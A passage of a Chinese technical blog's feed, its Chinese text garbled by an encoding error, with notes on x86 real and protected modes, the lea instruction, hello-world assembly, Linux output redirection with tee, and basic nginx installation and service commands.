title="å®æ¨¡å¼"></a>å®æ¨¡å¼</h2><ul><li>20ä½åœ°å€æ€»çº¿ï¼Œå¯ä»¥è®¿é—®1MB(0~FFFFF)å†…å­˜ï¼ˆ$2^{20}$=1MBï¼‰</li><li>16ä½æ•°æ®çº¿ï¼Œéœ€è¦å†…å­˜åˆ†æ®µæ‰èƒ½è¡¨ç¤º20ä½åœ°å€</li><li>æ®µï¼šå†…å­˜ç©ºé—´è¢«åˆ’åˆ†ä¸º64KBçš„æ®µ</li><li>æ®µåœ°å€å­˜æ”¾äº16ä½çš„æ®µå¯„å­˜å™¨ä¸­ï¼ˆCSã€DSã€ESã€SSï¼‰</li><li>ç‰©ç†åœ°å€=æ®µåœ°å€*10H+åç§»åœ°å€</li><li>è¾¨æ<ul><li>æ•°æ®æ€»çº¿ï¼šæ•°æ®æ€»çº¿ä¸º32ä½ï¼Œè¯´æ˜å¯ä»¥åŒæ—¶å¤„ç†32ä½çš„æ•°æ®ï¼Œä¹Ÿå³å­—é•¿ä¸º32ä½ï¼ˆCPUä¸€æ¬¡èƒ½å¹¶è¡Œå¤„ç†çš„äºŒè¿›åˆ¶ä½æ•°ï¼‰</li><li>åœ°å€æ€»çº¿ï¼šå†³å®šå¤„ç†å™¨çš„å¯»å€èŒƒå›´ã€‚20ä½åœ°å€æ€»çº¿ï¼Œå¯ä»¥è®¿é—®1MBå†…å­˜</li></ul></li></ul><h2 id="ä¿æŠ¤æ¨¡å¼"><a href="#ä¿æŠ¤æ¨¡å¼" class="headerlink" title="ä¿æŠ¤æ¨¡å¼"></a>ä¿æŠ¤æ¨¡å¼</h2><ul><li>32ä½åœ°å€æ€»çº¿å¯»å€ï¼Œæ¯ä¸ªç¨‹åºå¯å¯»å€4GBå†…å­˜ï¼š0~FFFFFFFFï¼ˆ$2^{32}=2^{30}*4$ï¼‰</li><li>æ®µå¯„å­˜å™¨(CSã€DSã€SSã€ESã€FSå’ŒGS)æŒ‡å‘æ®µæè¿°ç¬¦è¡¨é¡¹<ul><li>æ“ä½œç³»ç»Ÿä½¿ç”¨æ®µæè¿°ç¬¦è¡¨å®šä½ç¨‹åºä½¿ç”¨çš„æ®µçš„ä½ç½®</li><li>CSå­˜æ”¾ä»£ç æ®µæè¿°ç¬¦è¡¨é¡¹çš„åœ°å€</li><li>DSå­˜æ”¾æ•°æ®æ®µæè¿°ç¬¦è¡¨é¡¹çš„åœ°å€</li><li>SSå­˜æ”¾å †æ ˆæ®µæè¿°ç¬¦è¡¨é¡¹çš„åœ°å€</li></ul></li><li>æ‰€æœ‰æ®µè¢«æ˜ å°„åˆ°32ä½ç‰©ç†åœ°å€ç©ºé—´</li><li>ç¨‹åºè‡³å°‘ä¸¤ä¸ªæ®µï¼šä»£ç æ®µå’Œæ•°æ®æ®µ(CSã€DS)</li><li>åˆ†é¡µï¼šå°†ä¸€ä¸ªæ®µåˆ†å‰²æˆç§°ä¸ºé¡µï¼ˆPagesï¼‰çš„4KBçš„å†…å­˜å—</li><li>ç¼ºé¡µï¼šå½“ä»»åŠ¡è¿è¡Œæ—¶ï¼Œå½“å‰æ´»è·ƒçš„æ‰§è¡Œä»£ç ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè€Œç¨‹åºä¸­å½“å‰æœªä½¿ç”¨çš„éƒ¨åˆ†ï¼Œå°†ç»§ç»­ä¿å­˜åœ¨ç£ç›˜ä¸Šã€‚<strong>å½“CPUéœ€è¦æ‰§è¡Œçš„å½“å‰ä»£ç å­˜å‚¨åœ¨ç£ç›˜ä¸Šæ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªç¼ºé¡µé”™è¯¯ï¼Œå¼•èµ·æ‰€éœ€é¡µé¢çš„æ¢è¿›(ä»ç£ç›˜è½½å…¥å†…å­˜)</strong></li><li>åˆ†é¡µæ„ä¹‰ï¼šé€šè¿‡åˆ†é¡µä»¥åŠé¡µé¢çš„æ¢è¿›ã€æ¢å‡ºï¼Œä¸€å°å†…å­˜æœ‰é™çš„è®¡ç®—æœºä¸Šå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªå¤§ç¨‹åºï¼Œè®©äººæ„Ÿè§‰è¿™å°æœºå™¨çš„å†…å­˜æ— é™å¤§ï¼Œå› æ­¤ç§°ä¸ºè™šæ‹Ÿå†…å­˜</li></ul><h1 id="è®¡ç®—æœºæ˜¯æ€ä¹ˆè¿è¡Œçš„"><a href="#è®¡ç®—æœºæ˜¯æ€ä¹ˆè¿è¡Œçš„" class="headerlink" title="è®¡ç®—æœºæ˜¯æ€ä¹ˆè¿è¡Œçš„"></a>è®¡ç®—æœºæ˜¯æ€ä¹ˆè¿è¡Œçš„</h1><ul><li>å–æŒ‡ä»¤<ul><li>åœ¨åœ°å€CS:IP/EIP/RIPå¤„å–å‡ºæŒ‡ä»¤ï¼ˆåˆ†åˆ«å¯¹åº”å®æ¨¡å¼ã€32ä½ã€64ä½ï¼‰</li><li>IP/EIP/RIP = IP/EIP/RIP + æ‰€è¯»å–æŒ‡ä»¤çš„é•¿åº¦</li><li>IP/EIP/RIPæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤</li></ul></li><li>æ‰§è¡ŒæŒ‡ä»¤<ul><li>æ‰§è¡Œ</li><li>å–æŒ‡ä»¤</li></ul></li><li>é‡å¤ä¸Šé¢è¿‡ç¨‹</li></ul><h1 id="lea-æŒ‡ä»¤è§£æ"><a href="#lea-æŒ‡ä»¤è§£æ" class="headerlink" title="lea æŒ‡ä»¤è§£æ"></a>lea æŒ‡ä»¤è§£æ</h1><blockquote><p>å®ƒï¼ˆæŒ‡leaqï¼‰çš„æŒ‡ä»¤å½¢å¼æ˜¯ä»å†…å­˜è¯»æ•°æ®åˆ°å¯„å­˜å™¨ï¼Œä½†å®é™…ä¸Šå®ƒæ ¹æœ¬å°±æ²¡æœ‰å¼•ç”¨å†…å­˜ã€‚ä»–çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå†…å­˜å¼•ç”¨ï¼Œä½†è¯¥æŒ‡ä»¤å¹¶ä¸æ˜¯ä»æŒ‡å®šçš„ä½ç½®è¯»å…¥æ•°æ®ï¼Œè€Œæ˜¯å°†æœ‰æ•ˆåœ°å€å†™å…¥åˆ°ç›®çš„æ“ä½œæ•°</p></blockquote><p>leaï¼šload effective address</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">leaq (%rdi,%rsi,<span class="hljs-number">4</span>), %rax<br></code></pre></td></tr></table></figure><ul><li>æºæ“ä½œæ•°ï¼š(%rdi,%rsi,4)</li><li>ç›®çš„æ“ä½œæ•°ï¼š%rax</li><li>ä½œç”¨ï¼šå°†æºæ“ä½œæ•°çš„åœ°å€ï¼Œä¹Ÿå³æ˜¯%rdi + 4 * %rsi è£…è½½å…¥%raxã€‚%rax=%rdi + 4 * %rsi </li></ul><p>leal [A, B, C] D çš„è¯­ä¹‰å°±æ˜¯ D = A + B * C</p><ul><li>å¯ä»¥æŠŠAç†è§£ä¸ºæ•°ç»„çš„åŸºåœ°å€</li><li>Cç†è§£ä¸ºæ•°ç»„çš„æŸä¸ªå…ƒç´ </li><li>è¯¥æŒ‡ä»¤å°±æ˜¯å°†Aæ•°ç»„çš„ç¬¬Cä¸ªå…ƒç´ çš„åœ°å€å­˜åˆ°Dé‡Œé¢<h1 id="Intelæ±‡ç¼–ä»£ç ç¤ºä¾‹"><a href="#Intelæ±‡ç¼–ä»£ç ç¤ºä¾‹" class="headerlink" title="Intelæ±‡ç¼–ä»£ç ç¤ºä¾‹"></a>Intelæ±‡ç¼–ä»£ç ç¤ºä¾‹</h1></li></ul><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ARM"><span class="hljs-comment">; hello.asm</span><br><span class="hljs-symbol">.data</span> <span class="hljs-comment">; æ•°æ®æ®µå£°æ˜</span><br><span class="hljs-symbol">msg</span> db <span class="hljs-string">&quot;Hello, world! --------- Intel ASM .&quot;</span>, <span class="hljs-number">0xA</span> <span class="hljs-comment">; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²</span><br><span class="hljs-symbol">len</span> <span class="hljs-meta">equ</span> $ - msg <span class="hljs-comment">; </span><br><span class="hljs-symbol">.text</span> <span class="hljs-comment">; ä»£ç æ®µå£°æ˜</span><br><span class="hljs-symbol">global</span> _start <span class="hljs-comment">; æŒ‡å®šå…¥å£å‡½æ•°</span><br><span class="hljs-symbol">_start:</span> <span class="hljs-comment">; åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="hljs-keyword">mov</span> edx, len <span class="hljs-comment">; å‚æ•°ä¸‰ï¼šå­—ç¬¦ä¸²é•¿åº¦</span><br><span class="hljs-keyword">mov</span> ecx, msg <span class="hljs-comment">; å‚æ•°äºŒï¼šè¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">mov</span> ebx, <span class="hljs-number">1</span> <span class="hljs-comment">; å‚æ•°ä¸€ï¼šæ–‡ä»¶æè¿°ç¬¦(stdout)</span><br><span class="hljs-keyword">mov</span> eax, <span class="hljs-number">4</span> <span class="hljs-comment">; ç³»ç»Ÿè°ƒç”¨å·(sys_write)</span><br><span class="hljs-symbol">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">; è°ƒç”¨å†…æ ¸åŠŸèƒ½</span><br><span class="hljs-comment">; é€€å‡ºç¨‹åº</span><br><span class="hljs-keyword">mov</span> ebx, <span class="hljs-number">0</span> <span class="hljs-comment">; å‚æ•°ä¸€ï¼šé€€å‡ºä»£ç </span><br><span class="hljs-keyword">mov</span> eax, <span class="hljs-number">1</span> <span class="hljs-comment">; ç³»ç»Ÿè°ƒç”¨å·(sys_exit)</span><br><span class="hljs-symbol">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">; è°ƒç”¨å†…æ ¸åŠŸèƒ½</span><br></code></pre></td></tr></table></figure><h1 id="AT-amp-Tæ±‡ç¼–ä»£ç ç¤ºä¾‹"><a href="#AT-amp-Tæ±‡ç¼–ä»£ç ç¤ºä¾‹" class="headerlink" title="AT&amp;Tæ±‡ç¼–ä»£ç ç¤ºä¾‹"></a>AT&amp;Tæ±‡ç¼–ä»£ç ç¤ºä¾‹</h1><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ARM">  <span class="hljs-comment">#hello.s</span><br><span class="hljs-symbol">.data</span> # æ•°æ®æ®µå£°æ˜<br><span class="hljs-symbol">msg</span> : .string <span class="hljs-string">&quot;Hello, world! --------- AT&amp;T ASM\r\n &quot;</span> # è¦è¾“å‡ºçš„å­—ç¬¦ä¸²<br><span class="hljs-symbol">len</span> = . - msg # å­—ä¸²é•¿åº¦<br><span class="hljs-symbol">.text</span> # ä»£ç æ®µå£°æ˜<br><span class="hljs-symbol">.global</span> _start # æŒ‡å®šå…¥å£å‡½æ•°<br><span class="hljs-symbol">_start:</span> # åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²<br><span class="hljs-symbol">movl</span> $len, %edx # å‚æ•°ä¸‰ï¼šå­—ç¬¦ä¸²é•¿åº¦<br><span class="hljs-symbol">movl</span> $msg, %ecx # å‚æ•°äºŒï¼šè¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²<br><span class="hljs-symbol">movl</span> <span class="hljs-number">$1</span>, %ebx # å‚æ•°ä¸€ï¼šæ–‡ä»¶æè¿°ç¬¦(stdout)<br><span class="hljs-symbol">movl</span> <span class="hljs-number">$4</span>, %eax # ç³»ç»Ÿè°ƒç”¨å·(sys_write)<br><span class="hljs-symbol">int</span> <span class="hljs-number">$0x80</span> # è°ƒç”¨å†…æ ¸åŠŸèƒ½<br><span class="hljs-comment"># é€€å‡ºç¨‹åº</span><br><span class="hljs-symbol">movl</span> <span class="hljs-number">$0</span>,%ebx # å‚æ•°ä¸€ï¼šé€€å‡ºä»£ç <br><span class="hljs-symbol">movl</span> <span class="hljs-number">$1</span>,%eax # ç³»ç»Ÿè°ƒç”¨å·(sys_exit)<br><span class="hljs-symbol">int</span> <span class="hljs-number">$0x80</span> # è°ƒç”¨å†…æ ¸åŠŸèƒ½<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼Œcsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxè¾“å…¥è¾“å‡ºé‡å®šå‘</title>
    <link href="/p/5da01755/"/>
    <url>/p/5da01755/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯"><a href="#æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯" class="headerlink" title="æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯"></a>æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯</h1><ul><li><p>STDINï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š0ï¼›æ ‡å‡†è¾“å…¥ï¼Œé»˜è®¤ä»é”®ç›˜è¯»å–ä¿¡æ¯ï¼›</p></li><li><p>STDOUTï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š1ï¼›æ ‡å‡†è¾“å‡ºï¼Œé»˜è®¤å°†è¾“å‡ºç»“æœè¾“å‡ºè‡³ç»ˆç«¯ï¼›</p></li><li><p>STDERRï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š2ï¼›æ ‡å‡†é”™è¯¯ï¼Œé»˜è®¤å°†è¾“å‡ºç»“æœè¾“å‡ºè‡³ç»ˆç«¯</p></li></ul><h1 id="å¸¸ç”¨é‡å®šå‘å‘½ä»¤"><a href="#å¸¸ç”¨é‡å®šå‘å‘½ä»¤" class="headerlink" title="å¸¸ç”¨é‡å®šå‘å‘½ä»¤"></a>å¸¸ç”¨é‡å®šå‘å‘½ä»¤</h1><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘ã€<strong>è¿½åŠ </strong>åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &gt;&gt; SomeFile.txt<br></code></pre></td></tr></table></figure><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &amp;&gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯é‡å®šå‘ã€<strong>è¿½åŠ </strong>åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand &amp;&gt;&gt; SomeFile.txt  <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨teeå‘½ä»¤ï¼Œå°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SomeCommand 2&gt;&amp;1 | tee SomeFile.txt<br></code></pre></td></tr></table></figure><p>æ¥è‡ªStack Overflowçš„è¡¨æ ¼ï¼šï¼ˆn.e.è¡¨ç¤ºä¸å­˜åœ¨ï¼‰</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">          ||<span class="hljs-string"> visible in terminal </span>||<span class="hljs-string">   visible in file   </span>||<span class="hljs-string"> existing</span><br><span class="hljs-string">  Syntax  </span>||<span class="hljs-string">  StdOut  </span>|<span class="hljs-string">  StdErr  </span>||<span class="hljs-string">  StdOut  </span>|<span class="hljs-string">  StdErr  </span>||<span class="hljs-string">   file   </span><br><span class="hljs-string">==========++==========+==========++==========+==========++===========</span><br><span class="hljs-string">    &gt;     </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">    &gt;&gt;    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>   2&gt;     ||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">   2&gt;&gt;    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>   &amp;&gt;     ||<span class="hljs-string">    no    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string">   &amp;&gt;&gt;    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br> |<span class="hljs-string"> tee    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> tee -a </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">    no    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br> n.e. (<span class="hljs-symbol">*</span>) ||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"> n.e. (*) </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">    no    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br><span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<span class="hljs-string">          </span>|<span class="hljs-string">          </span>||<br>|<span class="hljs-string">&amp; tee    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string"> overwrite</span><br><span class="hljs-string"></span>|<span class="hljs-string">&amp; tee -a </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">   yes    </span>|<span class="hljs-string">   yes    </span>||<span class="hljs-string">  append</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim">tee<br><br>  Read from standard <span class="hljs-built_in">input</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">to</span> standard output <span class="hljs-built_in">and</span> <span class="hljs-keyword">files</span> (<span class="hljs-built_in">or</span> commands).<br>  More information: http<span class="hljs-variable">s:</span>//www.gnu.org/software/coreutils/tee.<br><br>  - Copy standard <span class="hljs-built_in">input</span> <span class="hljs-keyword">to</span> each <span class="hljs-keyword">file</span>, <span class="hljs-built_in">and</span> also <span class="hljs-keyword">to</span> standard outpu<span class="hljs-variable">t:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br>  - Append <span class="hljs-keyword">to</span> the given <span class="hljs-keyword">files</span>, <span class="hljs-keyword">do</span> not overwrite:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee -<span class="hljs-keyword">a</span> path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br>  - <span class="hljs-keyword">Print</span> standard <span class="hljs-built_in">input</span> <span class="hljs-keyword">to</span> the terminal, <span class="hljs-built_in">and</span> also pipe it into another program <span class="hljs-keyword">for</span> further processin<span class="hljs-variable">g:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee /dev/tty | xargs <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;[%s]&quot;</span><br><br>  - Create <span class="hljs-keyword">a</span> directory called <span class="hljs-string">&quot;example&quot;</span>, <span class="hljs-built_in">count</span> the <span class="hljs-keyword">number</span> of characters in <span class="hljs-string">&quot;example&quot;</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">write</span> <span class="hljs-string">&quot;example&quot;</span> <span class="hljs-keyword">to</span> the termina<span class="hljs-variable">l:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;example&quot;</span> | tee &gt;(xargs <span class="hljs-built_in">mkdir</span>) &gt;(wc -<span class="hljs-keyword">c</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nginxé«˜æ€§èƒ½webæœåŠ¡å™¨è¯¦è§£</title>
    <link href="/p/913c096e/"/>
    <url>/p/913c096e/</url>
    
    <content type="html"><![CDATA[<h1 id="å¸¸è§webæœåŠ¡å™¨ä»‹ç»"><a href="#å¸¸è§webæœåŠ¡å™¨ä»‹ç»" class="headerlink" title="å¸¸è§webæœåŠ¡å™¨ä»‹ç»"></a>å¸¸è§webæœåŠ¡å™¨ä»‹ç»</h1><ul><li>Apache<ul><li>a patchy server</li><li>å æ®webæœåŠ¡å™¨çš„åŠå£æ±Ÿå±±</li><li>å¼€æº</li></ul></li><li>Tomcat<ul><li>è½»é‡çº§åº”ç”¨æœåŠ¡å™¨</li><li>æ— æ³•æ»¡è¶³å¤æ‚ä¸šåŠ¡åœºæ™¯</li><li>å…è´¹ã€å¼€æº</li><li>ä½“ç§¯å°ï¼Œæ˜“äºå®‰è£…éƒ¨ç½²</li></ul></li><li>Nginx<ul><li>å…è´¹ã€å¼€æºã€åæ¥å±…ä¸Š</li><li>é«˜æ€§èƒ½httpæœåŠ¡å™¨</li><li>åŠŸèƒ½å¤šï¼ˆåŒ…æ‹¬æ”¯æŒåå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡ã€IMAP/POP3ä»£ç†æœåŠ¡ã€SSLç­‰åŠŸèƒ½ï¼‰</li><li>å¸¸ç”¨åŠŸèƒ½ï¼šè´Ÿè½½å‡è¡¡ã€åå‘ä»£ç†ã€webç¼“å­˜</li></ul></li></ul><h1 id="Nginxçš„å®‰è£…"><a href="#Nginxçš„å®‰è£…" class="headerlink" title="Nginxçš„å®‰è£…"></a>Nginxçš„å®‰è£…</h1><p>å®˜ç½‘ä¸Šçš„å‡ ä¸ªç‰ˆæœ¬ï¼š</p><ul><li>Mainline versionï¼šç›®å‰ä¸»åŠ›åœ¨åšçš„ç‰ˆæœ¬ï¼Œå¼€å‘ç‰ˆ</li><li>Stable versionï¼šæœ€æ–°ç¨³å®šç‰ˆï¼Œç”Ÿäº§ç¯å¢ƒä¸Šå»ºè®®ä½¿ç”¨çš„ç‰ˆæœ¬</li><li>Legacy versionsï¼šé—ç•™çš„è€ç‰ˆæœ¬çš„ç¨³å®šç‰ˆ</li></ul><p>å®‰è£…ï¼š</p><ul><li>ç”±äºNginxå‡çº§é¢‘ç¹ï¼ŒLinuxä¸‹å»ºè®®é€šè¿‡ç¼–è¯‘æºç è¿›è¡Œå®‰è£…ï¼ˆgcc + automakeï¼‰</li><li> sudo apt install nginx å‘½ä»¤å¯ä»¥ç›´æ¥å®‰è£…</li><li> å®‰è£…å®Œæˆåï¼Œè¿è¡Œ whereis nginx ä»¥å‘ç°ç¨‹åºçš„å®‰è£…ä½ç½®</li><li>pidof nginxå¯ä»¥å®šä½Nginxçš„è¿›ç¨‹å·</li></ul><p>ä¸€äº›ç‰¹æ®Šæ–‡ä»¶ï¼š</p><ul><li>index.htmlï¼šæœåŠ¡å¯åŠ¨æˆåŠŸåé»˜è®¤æ˜¾ç¤ºçš„é¡µé¢</li><li>logsç›®å½•ï¼šæœåŠ¡å™¨æ—¥å¿—</li><li>sbinç›®å½•ï¼šåªæœ‰Nginxä¸€ä¸ªæ–‡ä»¶ï¼ˆå¯æ‰§è¡Œç¨‹åºï¼‰</li></ul><h1 id="NginxæœåŠ¡çš„å¯åœæ§åˆ¶"><a href="#NginxæœåŠ¡çš„å¯åœæ§åˆ¶" class="headerlink" title="NginxæœåŠ¡çš„å¯åœæ§åˆ¶"></a>NginxæœåŠ¡çš„å¯åœæ§åˆ¶</h1><p>åˆ—å‡ºè¿›ç¨‹ï¼š</p><ul><li>pidof</li><li>cat nginx.pid</li><li>ps -ef | grep nginx</li></ul><p>å¸¸ç”¨æŒ‡ä»¤ï¼š</p><ul><li>kill signal pid æ€æ‰è¿›ç¨‹</li><li>sudo nginx -t  æµ‹è¯•Nginxé…ç½®æ–‡ä»¶è¯­æ³•</li><li>sudo nginx -v ç‰ˆæœ¬</li><li>sudo systemctl start nginx å¯åŠ¨nginx</li><li>sudo systemctl stop nginx åœæ­¢nginx</li><li>sudo systemctl restart nginx é‡å¯nginx</li><li>sudo systemctl reload nginx é…ç½®æ›´æ”¹æ—¶ï¼Œé‡æ–°åŠ è½½nginx</li><li>sudo systemctl status nginx æŸ¥çœ‹NginxçŠ¶æ€</li></ul><h1 id="NginxåŸºç¡€é…ç½®"><a href="#NginxåŸºç¡€é…ç½®" class="headerlink" 